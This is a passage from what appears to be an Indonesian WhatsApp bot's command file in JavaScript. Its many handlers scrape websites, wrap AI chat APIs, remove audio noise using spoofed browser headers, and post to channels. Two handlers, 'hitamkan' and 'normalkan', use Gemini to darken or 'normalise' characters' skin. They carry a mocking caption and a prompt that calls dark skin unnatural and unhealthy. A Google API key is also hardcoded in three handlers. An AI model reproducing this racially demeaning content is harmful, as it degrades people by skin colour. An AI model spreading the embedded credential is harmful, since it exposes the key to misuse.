    return m.reply('Kirim Atau Reply Video Atau Audio Dengan Caption .talknotes');
  }
  
  m.reply('*Please Wait...*');
  
  try {
    let buffer = await quoted.download();
    
    const fileSizeInBytes = buffer.length;
    const maxSize = 5 * 1024 * 1024;

    if (fileSizeInBytes > maxSize) {
      return m.reply("Max Size 5 MB Yaa");
    }

    const result = await Talknotes(buffer);
    
    if (!result || !result.text) {
      return m.reply('Gagal Nanti Coba Lagi Jangan Di Spam');
    }
    
    m.reply(`*Result :*\n\n${result.text}`);
    
  } catch (error) {
    console.error(error);
    m.reply('Terjadi kesalahan saat memproses audio.');
  }

}

break
    
 //=========================================
    
/* 
Cjs To Esm & Esm To Cjs
Type : Plugins Esm
Sumber : https://whatsapp.com/channel/0029VaylUlU77qVT3vDPjv11
*/

case 'case2plug' : case 'plug2case' : case 'tocase' : case 'toplug': {

function convertCJSToESM(code) {
    return code
        .replace(/const (\w+) = require\(['"](.+?)['"]\);?/g, 'import $1 from \'$2\';')
        .replace(/let (\w+) = require\(['"](.+?)['"]\);?/g, 'import $1 from \'$2\';')
        .replace(/var (\w+) = require\(['"](.+?)['"]\);?/g, 'import $1 from \'$2\';')
        .replace(/module\.exports\s*=\s*(.*?);?/g, 'export default $1;')
        .replace(/exports\.(\w+)\s*=\s*(.*?);?/g, 'export const $1 = $2;')
        .replace(/require\(['"](.+?)['"]\)/g, 'await import(\'$1\')'); 
}

function convertESMToCJS(code) {
    return code
        .replace(/import (\w+) from ['"](.+?)['"];/g, 'const $1 = require(\'$2\');')
        .replace(/import \* as (\w+) from ['"](.+?)['"];/g, 'const $1 = require(\'$2\');')
        .replace(/import \{(.*?)\} from ['"](.+?)['"];/g, (match, p1, p2) => {
            const imports = p1.split(',').map(i => i.trim());
            return `const { ${imports.join(', ')} } = require('${p2}');`;
        })
        .replace(/export default (\w+);?/g, 'module.exports = $1;')
        .replace(/export const (\w+) = (\w+);?/g, 'exports.$1 = $2;')
        .replace(/export (.*?) from ['"](.+?)['"];/g, (match, p1, p2) => {
            return `module.exports.${p1} = require('${p2}');`;
        }); 
}

    let codeToConvert = text || (m.quoted && m.quoted.text);

    if (!codeToConvert) throw `Masukkan atau reply kode yang ingin diubah`;

    let result;
    if (command === 'toplug') {
        result = convertCJSToESM(codeToConvert);
    } else if (command === 'tocase') {
        result = convertESMToCJS(codeToConvert);
    } else {
        throw `Perintah tidak dikenal`;
    }

    m.reply(result);
};

    
 //=========================================
    
/*
Jangan Hapus Wm Bang 

*Removal Noise  Plugins Esm*

Noise Removal Itu Apa Min? Pertanyaan Bangus :D Menurut Chatgpt  Noise Removal adalah proses menghilangkan gangguan atau noise dari sinyal agar lebih jelas dan akurat

*[Sumber]*
https://whatsapp.com/channel/0029Vb3u2awADTOCXVsvia28

*[Sumber Scrape]*

ZErvida 
*/
case 'removenoise' : case 'rnoise' :case 'rn' :  {
const axios = require('axios');
const crypto = require('crypto');
const FormData = require('form-data');
const promises = require('fs');
const { join } = require('path');

function cyphereddata(t, r = "cryptoJS") {
    t = t.toString();
    const e = crypto.randomBytes(32);
    const a = crypto.randomBytes(16);
    const i = crypto.pbkdf2Sync(r, e, 999, 32, 'sha512');
    const cipher = crypto.createCipheriv('aes-256-cbc', i, a);
    let encrypted = cipher.update(t, 'utf8', 'base64');
    encrypted += cipher.final('base64');
    return JSON.stringify({
        amtext: encrypted,
        slam_ltol: e.toString('hex'),
        iavmol: a.toString('hex')
    });
}

const NoiseRemover = {
    async run(buffer) {
        const timestamp = Math.floor(Date.now() / 1000);
        const encryptedData = JSON.parse(cyphereddata(timestamp));

        const formData = new FormData();
        formData.append('media', buffer, { filename: crypto.randomBytes(3).toString('hex')+'_halo.mp3' });
        formData.append('fingerprint', crypto.randomBytes(16).toString('hex'));
        formData.append('mode', 'pulse');
        formData.append('amtext', encryptedData.amtext);
        formData.append('iavmol', encryptedData.iavmol);
        formData.append('slam_ltol', encryptedData.slam_ltol);

        const response = await axios.post(
            'https://noiseremoval.net/wp-content/plugins/audioenhancer/requests/noiseremoval/noiseremovallimited.php',
            formData,
            {
                headers: {
                    ...formData.getHeaders(),
                    "accept": "*/*",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "sec-ch-ua": "\"Not A(Brand\";v=\"8\", \"Chromium\";v=\"132\"",
                    "sec-ch-ua-mobile": "?1",
                    "sec-ch-ua-platform": "\"Android\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "x-requested-with": "XMLHttpRequest",
                    "Referer": "https://noiseremoval.net/",
                    "Referrer-Policy": "strict-origin-when-cross-origin"
                },
            }
        );

        return response.data;
    },
};

    try {
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        
        if (!/audio|video/.test(mime)) {
            return m.reply('Kirim/Reply audio atau video yang ingin dihilangkan noisenya');
        }
        
        m.reply('Sedang memproses audio, mohon tunggu...');
        
        const media = await quoted.download();
        const result = await NoiseRemover.run(media);
        
        if (result.error) {
            return m.reply(`Gagal menghilangkan noise: ${result.message}`);
        }
        
        const enhancedAudioUrl = result.media.enhanced.uri;
        const originalAudioUrl = result.media.original.uri;
        
        const inpo = `*Noise Removal Successful*

*⭐ Info Audio*
- Original : ${originalAudioUrl}
- Enhanced : ${enhancedAudioUrl}

*📊 Status*
- Status : ${result.flag}
- Message : ${result.message}
- Worker : ${result.worker}`;

        await Sky.sendMessage(m.chat, {
            audio: { url: enhancedAudioUrl },
            mimetype: 'audio/mp4',
            fileName: 'enhanced-audio.mp3',
            ptt: true //False Kalau Mau Audio
        }, { quoted: m });
        
        m.reply(inpo);
        
    } catch (error) {
        console.error(error);
        m.reply('Terjadi kesalahan saat memproses audio');
    }
};
break
    
 //=========================================
    
/*   
Base : Dapur Umami Recipe Scraper  
Telegram : t.me/kayzuMD  
WhatsApp Channel : https://whatsapp.com/channel/0029Vb2OwWCElagtreIoke17  
Sumber Case : https://whatsapp.com/channel/0029Vb9vAP3AjPXKqBBuwv2s  
Type : Plug-in CJS  
Created by : Kayzu MD 🐦‍⬛  
Thanks to : Kayzy Hosting & Dapur Umami  
*/
case 'dapurumami' : {

const axios = require("axios");
const cheerio = require("cheerio");

const dapurUmmi = {
   searching: async (resep) => {
      try {
         let { data } = await axios.get(`https://www.dapurumami.com/search?q=${resep}&tab=recipe&sort=relevan`);
         let $ = cheerio.load(data);

         let hasil = [];

         $(".recipe-card").each((i, el) => {
            let title = $(el).find(".recipe-title").text().trim();
            let link = $(el).find("a").attr("href");
            let image = $(el).find("img").attr("src");

            if (title && link) {
               hasil.push({
                  title,
                  link: `https://www.dapurumami.com${link}`,
                  image
               });
            }
         });

         return hasil;
      } catch (error) {
         return `Error: ${error.message}`;
      }
   }
};

   if (!text) return m.reply('⚠️ Masukkan nama resep yang ingin dicari!');
try {
   // Reaksi proses 🍳  
   await Sky.sendMessage(m.chat, {  
       react: { text: "🕒", key: m.key }  
   });  

   let result = await dapurUmmi.searching(text);
   if (!result.length) return m.reply('❌ Resep tidak ditemukan!');

   let caption = `*📖 Hasil Pencarian Resep: ${text}*\n\n`;
   result.slice(0, 5).forEach((res, i) => {
      caption += `🍽️ *${res.title}*\n🔗 [Lihat Resep](${res.link})\n\n`;
   });

   // Reaksi selesai ✅  
   await Sky.sendMessage(m.chat, {  
       react: { text: "✅", key: m.key }  
   });  

   await Sky.sendMessage(m.chat, { text: caption }, { quoted: m });
    } catch (err) {
 m.reply(`Terjadi kesalahan!! laporkan teks ini ke owner: ${err.message}`);
 console.error(err);
 }

};

break
    
//==========================================
    
/*[ *`Case Deepseek Ai`* ]
> author: alby
> type: case
> rest api: https://www.laurine.site
> sumber: https://whatsapp.com/channel/0029Vb0TzNUG8l5C4768d60n
> note: masih newbie, jdi maklum kalo code kurang rapih :v
*/
case 'deepseek': {
    if (!text) return m.reply("Hai, Aku AI DeepSeek. Apa yang bisa ku bantu?");
    
    try {
        const fetch = require("node-fetch");
        const response = await fetch(`https://www.laurine.site/api/ai/deepseek?query=${encodeURIComponent(text)}%20jawab%20menggunakan%20bahasa%20indonesia`);
        const ahh = await response.json();

        if (!ahh || !ahh.data) {
            return m.reply("⚠️ Maaf, tidak dapat mengambil jawaban saat ini.");
        }

        m.reply(`🐋 *DeepSeek AI Response:*\n\n${ahh.data}`);
    } catch (error) {
        console.error("DeepSeek Error:", error);
        m.reply("❌ Terjadi kesalahan saat menghubungi DeepSeek AI.", error);
    }
}
break;  
    
//==========================================
    
/*  

  Base : Apikey
  Telegram : t.me/kayzuMD
  Type : Plug-in CJS
  Share Code :  YTCAPTION
  Link CH : https://whatsapp.com/channel/0029Vb2OwWCElagtreIoke17

*/
case 'transkripyt' : case 'transkrip' : case 'yttranscript' : {
const axios = require("axios");


    if (!args[0]) return m.reply(`📌 *Masukkan URL video YouTube!*\n\nContoh: ${prefix + command} https://youtube.com/shorts/f2pEyPSz4oY`);

    let videoUrl = args[0];
    let apiUrl = `https://fastrestapis.fasturl.cloud/tool/yt-transcript?url=${encodeURIComponent(videoUrl)}`;

    try {
        // Kirim reaksi saat proses dimulai
        await Sky.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

        let response = await axios.get(apiUrl);
        let result = response.data.result;

        if (!result) return m.reply("🚫 *Tidak ditemukan transkrip untuk video ini.*");

        m.reply(`📜 *Transkrip Video YouTube:*\n\n${result}`);

        // Reaksi setelah selesai
        await Sky.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {
        console.error("❌ Error YouTube Transcript:", error);
        m.reply("⚠️ Terjadi kesalahan saat mengambil transkrip.");
    }
};
break
    
//==========================================
    
/* 
Base : AI Rieltem API
Telegram : t.me/kayzuMD
WhatsApp Channel : https://whatsapp.com/channel/0029Vb2OwWCElagtreIoke17
Sumber Case : https://whatsapp.com/channel/0029Vb9vAP3AjPXKqBBuwv2s
Type : Plug-in CJS
Created by : Kayzu MD 🐦‍⬛
Thanks to : Ererex & ai.riple.org
*/
case 'aix' : {
const axios = require("axios");

async function aiRieltem(text) {
let payload = {
messages: [{
content: text,
role: "user"
}]
};

try {
let { data } = await axios.post("https://ai.riple.org/", payload, {
headers: {
"Content-Type": "application/json",
"Accept": "application/json",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
},
responseType: "stream"
});

return new Promise((resolve, reject) => {  
     let fullResponse = "";  

     data.on("data", (chunk) => {  
        let lines = chunk.toString().split("\n");  

        for (let line of lines) {  
           if (line.startsWith("data: ")) {  
              let jsonString = line.slice(6).trim();  

              if (jsonString === "[DONE]") {  
                 return resolve(fullResponse.trim());  
              }  

              try {  
                 let parsedData = JSON.parse(jsonString);  
                 let content = parsedData?.choices?.[0]?.delta?.content;  

                 if (content) {  
                    fullResponse += content;  
                 }  
              } catch (err) {  
                 reject(err);  
              }  
           }  
        }  
     });  

     data.on("error", (err) => reject(err));  
  });

} catch (error) {
throw new Error(error.message);
}
}

if (!text) return m.reply('⚠️ Masukkan pertanyaan yang ingin ditanyakan ke AI Real Time');

// Reaksi proses 🤖  
await Sky.sendMessage(m.chat, {  
    react: { text: "🤖", key: m.key }  
});  

let response;  
try {  
    response = await aiRieltem(text);  
} catch (error) {  
    await Sky.sendMessage(m.chat, {  
        react: { text: "❌", key: m.key }  
    });  
    return m.reply('❌ Gagal mendapatkan jawaban dari AI!');  
}  

let caption = `*🤖 Jawaban dari AI Rieltem*\n\n📝 *Pertanyaan:* ${text}\n💡 *Jawaban:* ${response}`;  

// Reaksi selesai ✅  
await Sky.sendMessage(m.chat, {  
    react: { text: "✅", key: m.key }  
});  

await Sky.sendMessage(m.chat, { text: caption }, { quoted: m });

};
break
    
//=========================================
    
case 'chatowner' : case 'pmowner' : case 'chatown' : case 'cs' : {
if (!text) return m.reply(`Ketik ${prefix+command} teksnya`)
let Obj = global.owner
  Sky.sendMessage(Obj + "@s.whatsapp.net", {
    text: `*Ada pesan baru dari:@${m.sender.split("@")[0]}*\n*Isinya:${text}*`,
    contextInfo: { isForwarded: true }
  }, { quoted: m })
await Sky.sendMessage(m.chat, { text: `Berhasil mengirim pesan ke owner!\nTunggu info lebih lanjut di saluran bot: https://whatsapp.com/channel/0029Vb9R8pgAzNbzE3K8QP39`}, {quoted:m})
}
break
    
//=============================================
    
/*   
Base : KaryaKarsa Puisi Scraper  
Telegram : t.me/kayzuMD  
WhatsApp Channel : https://whatsapp.com/channel/0029Vb2OwWCElagtreIoke17  
Sumber Case : https://whatsapp.com/channel/0029Vb9vAP3AjPXKqBBuwv2s  
Type : Plug-in CJS  
Created by : Kayzu MD 🐦‍⬛  
Thanks to : Kayzy Hosting & Karyakarsa  
*/
case 'puisiacak' : {
const axios = require("axios");
const cheerio = require("cheerio");

const BASE = "https://karyakarsa.com/sigota/kumpulan-puisi-random-2";

async function puisi() {
    try {
        let { data } = await axios.get(BASE);
        let $ = cheerio.load(data);

        let puisiList = [];
        
        $(".content-lock p").each((i, el) => {
            let text = $(el).text().trim();
            if (text) puisiList.push(text);
        });

        let puisiFormatted = [];
        let currentPuisi = [];

        for (let line of puisiList) {
            if (line === "-----------") {
                if (currentPuisi.length) {
                    puisiFormatted.push(currentPuisi);
                    currentPuisi = [];
                }
            } else {
                currentPuisi.push(line);
            }
        }

        if (currentPuisi.length) puisiFormatted.push(currentPuisi);

        if (puisiFormatted.length === 0) return null;

        let randomIndex = Math.floor(Math.random() * puisiFormatted.length);
        return puisiFormatted[randomIndex].join("\n");
    } catch (error) {
        return `Error: ${error.message}`;
    }
}

    let puisiText = await puisi();
    if (!puisiText) return m.reply('⚠️ Tidak ada puisi yang bisa diambil.');

    let caption = `*📜 Puisi Random dari Karyakarsa*\n\n${puisiText}`;

    await Sky.sendMessage(m.chat, { text: caption }, { quoted: m });
};

break
    
 //==============================================
    
case 'proai': case 'aipro': {
  if (!text) return m.reply(`Halo! Ada yang bisa saya bantu hari ini? Silakan berikan pertanyaan Anda. Contoh: ${prefix}ai siapa presiden indonesia`);

  // Reaksi 'memproses'
  await Sky.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

  try {
    // URL API baru dari Zenz.biz.id untuk LuminAI
    const apiUrl = `https://zenzxz.dpdns.org/ai/luminai?text=${encodeURIComponent(text)}`;

    const response = await axios.get(apiUrl);
    const apiResponseData = response.data;

    console.log("DEBUG: Full API Response Data:", JSON.stringify(apiResponseData, null, 2));

    // Periksa status utama dan keberadaan hasil
    if (!apiResponseData.status || !apiResponseData.result) {
      console.log("DEBUG: API Top-level status is false or result is missing.");
      return m.reply("❌ Gagal mendapatkan respons dari AI. Mungkin ada masalah dengan API atau respons tidak valid.");
    }

    // Ambil hasil langsung dari field 'result'
    const aiAnswer = apiResponseData.result;
    console.log("DEBUG: Extracted AI Answer:", aiAnswer);

    const replyMsg = `🤖 *LuminAI Chatbot*\n\n${aiAnswer}`
    
    console.log("DEBUG: Constructed Reply Message:", replyMsg);

    await m.reply(replyMsg);

    // Reaksi 'berhasil'
    await Sky.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

  } catch (error) {
    console.error("DEBUG: Caught error in AI command:", error);
    // Reaksi 'gagal'
    await Sky.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
    m.reply(`❌ Terjadi kesalahan saat menghubungi AI. Mungkin ada masalah jaringan atau API. Error: ${error.message || error}`);
  }
};
break;
    
 //==============================================
/*(Fitur Create Image (Bing))*

Type: Case

*[ Sumber ]* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v
*/
case "imgbing": case "bingimg": {

    if (!args.length) return m.reply("Masukkan prompt gambar!\nContoh: imgbing mobil sport merah");

    let query = encodeURIComponent(args.join(" "));

    let url = `https://beta.anabot.my.id/api/ai/bingImgCreator?prompt=${query}&apikey=freeApikey`;

    try {

        await Sky.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

        let response = await fetch(url);

        let data = await response.json();

        if (data.status !== 200 || !data.data.result.length) {

            return m.reply("Gambar tidak ditemukan!");

        }

        for (let img of data.data.result) {

            await Sky.sendMessage(m.chat, { image: { url: img }, caption: "Maaf Jika Tidak Sesuai 😌" }, { quoted: m });

        }

        await Sky.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (error) {

        console.error(error);

        m.reply("Terjadi kesalahan saat mengambil gambar.");

    }

}

    break
   
//===============================================
    
/*
[ Fitur HDVideo ]*
*Sumber Case:* https://whatsapp.com/channel/0029VakRR89L7UVPwf53TB0v
*Sumber Plugins:* https://whatsapp.com/channel/0029Vb1NWzkCRs1ifTWBb13u
jangan lupa: npm i ffmpeg-static
*/
case "hdvideo":
case "hdvid": {
    const ffmpeg = require('fluent-ffmpeg');
    const ffmpegStatic = require('ffmpeg-static');
    const { writeFile, unlink, mkdir } = require('fs').promises;
    const { existsSync } = require('fs');
    const path = require('path');

    if (!ffmpegStatic) {
        return Sky.sendMessage(m.chat, { text: "❌ FFMPEG tidak ditemukan! Pastikan sudah diinstal dengan benar." }, { quoted: m });
    }
    ffmpeg.setFfmpegPath(ffmpegStatic);
    let inputPath, outputPath;
    try {
        let q = m.quoted || m;
        let mime = q.mimetype || q.msg?.mimetype || q.mediaType || "";
        if (!mime) return Sky.sendMessage(m.chat, { text: "❌ Mana videonya?" }, { quoted: m });
        if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
            return Sky.sendMessage(m.chat, { text: `❌ Format ${mime} tidak didukung!` }, { quoted: m });
        }
        Sky.sendMessage(m.chat, { text: "⏳ Sedang memproses video, mohon tunggu sekitar 2 - 20 menit..." }, { quoted: m });
        let videoBuffer = await q.download?.();
        if (!videoBuffer) return Sky.sendMessage(m.chat, { text: "❌ Gagal mengunduh video!" }, { quoted: m });
        let tempDir = path.join(__dirname, './container/library/database/sampah/');
        if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });
        inputPath = path.join(tempDir, `input_${Date.now()}.mp4`);
        outputPath = path.join(tempDir, `output_${Date.now()}.mp4`);
        await writeFile(inputPath, videoBuffer);
        await new Promise((resolve, reject) => {
            ffmpeg(inputPath)
                .outputOptions([
                    '-vf', 'scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.2,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
                    '-r', '60',
                    '-preset', 'medium',
                    '-crf', '30',
                    '-c:v', 'libx264',
                    '-pix_fmt', 'yuv420p',
                    '-c:a', 'aac',
                    '-b:a', '128k'
                ])
                .on('end', resolve)
                .on('error', reject)
                .save(outputPath);
        });
        await Sky.sendMessage(m.chat, { 
            video: { url: outputPath },
            caption: "✅ Video berhasil ditingkatkan kualitasnya!"
        }, { quoted: m });
    } catch (err) {
        console.error("Error HD Video:", err);
        Sky.sendMessage(m.chat, { text: "❌ Gagal meningkatkan kualitas video." }, { quoted: m });
    } finally {
        setTimeout(() => {
            if (inputPath) unlink(inputPath).catch(() => {});
            if (outputPath) unlink(outputPath).catch(() => {});
        }, 5000);
    }
}
break


    
//================================================
    
case "upchannelwn": case "upchwm": {
if (!isCreator && !isPremium) return Reply(mess.saluran)
if (!text.includes("|")) return m.reply('Ketik .upchwm tesknya|nama\n .upchwm halo|rafz')
let splitText = text.split("|").map(t => t.trim());
let ppuser
try {
ppuser = await Sky.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const teksnya = splitText[0];
const nama = splitText[1];
const teks = `${teksnya}`
await Sky.sendMessage(idSaluran, {text: teks, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `RafzBotz By Rafz`, 
body: `Pesan dari ${nama}`, 
thumbnailUrl: ppuser, 
sourceUrl: linkSaluran,
}}}, {quoted: m})
m.reply(`Berhasil mengirim pesan ${teksnya} ke saluran!!`)
}
break
    
//=================================================
    
case "izinsaluran": {
if (!isCreator && !isPremium) return Reply(mess.saluran)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || premium.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah memiliki akses ke saluran!`)
premium.push(input)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil memberikan ${input2} akses saluran!`)
}
break
    
//=================================================
    
case "delizinsaluran": {
if (!isCreator && !isPremium) return Reply(mess.salurab)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!premium.includes(input)) return m.reply(`Nomor ${input2} belum memiliki izin akses ke saluran!`)
let posi = premium.indexOf(input)
await premium.splice(posi, 1)
await fs.writeFileSync("./library/database/premium.json", JSON.stringify(premium, null, 2))
m.reply(`Berhasil menghapus akses ${input2} ke saluran ✅`)
}
break
    
//=================================================
    
case "publicchat": case "pc": {
if (!text.includes("|")) return m.reply('Ketik .publicchat tesknya|nama\nContoh:\n.publicchat halo|rafz')
let splitText = text.split("|").map(t => t.trim());
let ppuser
try {
ppuser = await Sky.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
const teksnya = splitText[0];
const nama = splitText[1];
const teks = `${teksnya}

> Rafz`
await Sky.sendMessage("120363419172959619@newsletter", {text: teksnya, mentions: [m.sender], contextInfo: {
externalAdReply: {
title: `RafzBotz By Rafz`, 
body: `Pesan dari @${nama}`, 
thumbnailUrl: ppuser, 
sourceUrl: linkSaluran,
}}}, {quoted: m})
m.reply(`Berhasil mengirim pesan ${teksnya} ke saluran publicchat!!\nLink Public chat: https://whatsapp.com/channel/0029VbAyqrL1NCrOJP9Fhx3A `)
}
break

    
//====================================================

//Sumber? Ch ini

case "sggl":
case "searchgoogle": {
    if (!q) return m.reply("Masukkan kata kunci pencarian!");    
    let url = `https://api.hiuraa.my.id/search/google?q=${encodeURIComponent(q)}`;
    try {
        let res = await fetch(url);
        let json = await res.json();
        if (!json.status || !json.result.length) return m.reply("Tidak ada hasil ditemukan.");
        let hasil = json.result.map((item, i) => 
            `*${i + 1}. ${item.title}*\n${item.desc}\n🔗 ${item.link}`
        ).join("\n\n");

        m.reply(`🔍 *Hasil Pencarian Google:*\n\n${hasil}`);
    } catch (e) {
        console.error(e);
        m.reply("Terjadi kesalahan saat mengambil data.");
    }
}
    break

//=======================================================

/*
📌 Nama Fitur. : Convert Mata Uang
🏷️ Type : case (cjs)
🔗 sumber : https://whatsapp.com/channel/0029VasjrIh3gvWXKzWncf2P
✍️ Code by FlowFalcon

♨️ Scrape source : https://whatsapp.com/channel/0029Vb2PdQe8qIzxs9HgKQ26/142
*/
case 'convert': {
    if (!text.includes('|')) return m.reply(`Gunakan format: ${prefix + command} <jumlah>|<dari>|<ke>\nContoh: ${prefix + command} 1|USD|IDR`);

    const axios = require('axios');
    const cheerio = require('cheerio');

let splitText = text.split("|").map(t => t.trim());
const jumlah = splitText[0];
const dari = splitText[1];
const ke = splitText[2]

    async function convertCurrency(jumlah, dari, ke) {
        const url = `https://www.xe.com/currencyconverter/convert/?Amount=${jumlah}&From=${dari}&To=${ke}`;
        try {
            const { data } = await axios.get(url);
            const $ = cheerio.load(data);
            const conversionText = $('div[data-testid="conversion"]').find('p.hVDvqw').text().trim();
            const numberMatch = conversionText.match(/([\d,\.]+)/);

            if (numberMatch) {
                return parseFloat(numberMatch[0].replace(/,/g, ''));
            } else {
                throw new Error('Data konversi tidak ditemukan');
            }
        } catch (error) {
            console.error('Error:', error);
            throw error;
        }
    }

    await Sky.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

    try {
        const rate = await convertCurrency(jumlah, dari, ke);
        m.reply(`💱 *Konversi Mata Uang*\n\n📌 ${jumlah} ${dari} = ${rate} ${ke}\n🔗 *Sumber:* www.xe.com`);
        await Sky.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

    } catch (err) {
        console.error(err);
        m.reply("❌ Terjadi kesalahan saat mengambil data konversi.");
    }
}
break;


//=======================================================

/*
Jangan Hapus Wm Bang 

*Penghitam Waipu  Plugins Esm*

Hitam Kan Waifu Mu 

Google Gemini Apikey Nya Bisa Kalian sendiri bisa Pake Milikku Terserah Sih 

*[Sumber]*
https://whatsapp.com/channel/0029Vb3u2awADTOCXVsvia28

*[Source Func]*

https://whatsapp.com/channel/0029Vb9ZfML6GcGFm9aPgh0W/118
perlu npm i @google/generative-ai
*/
case 'hitamkan' : case 'hitamkanwaifu' : {
const { GoogleGenerativeAI } =  require("@google/generative-ai");
const fs = require("fs");
const path = require("path");


  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = "Ubahlah Karakter Dari Gambar Tersebut Diubah Kulitnya Menjadi Hitam";
  
  if (!mime) return m.reply(`Kirim/reply gambar dengan caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  m.reply("Sedang menghitamkan...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyCuQOocC6ny8Edq8rskMe2NN_lgcfaaf5g");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "/library/database/sampah/", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Sky.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Wahaha Makan Nih Hytam*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Gagal Menghitamkan.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}

break

//=======================================================

/*
Jangan Hapus Wm Bang 

*Penghitam Waipu  Plugins Esm*

Hitam Kan Waifu Mu 

Google Gemini Apikey Nya Bisa Kalian sendiri bisa Pake Milikku Terserah Sih 

*[Sumber]*
https://whatsapp.com/channel/0029Vb3u2awADTOCXVsvia28

*[Source Func]*

https://whatsapp.com/channel/0029Vb9ZfML6GcGFm9aPgh0W/118
perlu npm i @google/generative-ai
*/
case 'normalkan' : case 'normalkanwaifu' : {
const { GoogleGenerativeAI } =  require("@google/generative-ai");
const fs = require("fs");
const path = require("path");


  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = "Warna kulit karakter ini terlalu gelap/tidak wajar. Tolong normalkan warna kulitnya agar terlihat lebih alami dan sehat, tanpa mengubah baju atau warna rambutnya.";
  
  if (!mime) return m.reply(`Kirim/reply gambar dengan caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return m.reply(`Format ${mime} tidak didukung! Hanya jpeg/jpg/png`);
  
  let promptText = text || defaultPrompt;
  
  m.reply("Sedang menormalkan...");
  
  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyCuQOocC6ny8Edq8rskMe2NN_lgcfaaf5g");
    
    const base64Image = imgData.toString("base64");
    
    const contents = [
      { text: promptText },
      {
        inlineData: {
          mimeType: mime,
          data: base64Image
        }
      }
    ];
    
    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: {
        responseModalities: ["Text", "Image"]
      },
    });
    
    const response = await model.generateContent(contents);
    
    let resultImage;
    let resultText = "";
    
    for (const part of response.response.candidates[0].content.parts) {
      if (part.text) {
        resultText += part.text;
      } else if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }
    
    if (resultImage) {
      const tempPath = path.join(process.cwd(), "/library/database/sampah/", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);
      
      await Sky.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sudah Tobat*`
      }, { quoted: m });
      
      setTimeout(() => {
        try {
          fs.unlinkSync(tempPath);
        } catch {}
      }, 30000);
    } else {
      m.reply("Gagal Menormalkan.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}

break
//=======================================================
 
/*
Jangan Hapus Wm Bang 

*Penghitam Waipu  Plugins Esm*

Hitam Kan Waifu Mu 

Google Gemini Apikey Nya Bisa Kalian sendiri bisa Pake Milikku Terserah Sih 

*[Sumber]*
https://whatsapp.com/channel/0029Vb3u2awADTOCXVsvia28

*[Source Func]*

https://whatsapp.com/channel/0029Vb9ZfML6GcGFm9aPgh0W/118
perlu npm i @google/generative-ai
*/
case 'editimg' : case 'edit' : {
const { GoogleGenerativeAI } =  require("@google/generative-ai");
const fs = require("fs");
const path = require("path");


  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  
  let defaultPrompt = `${text}`;
  
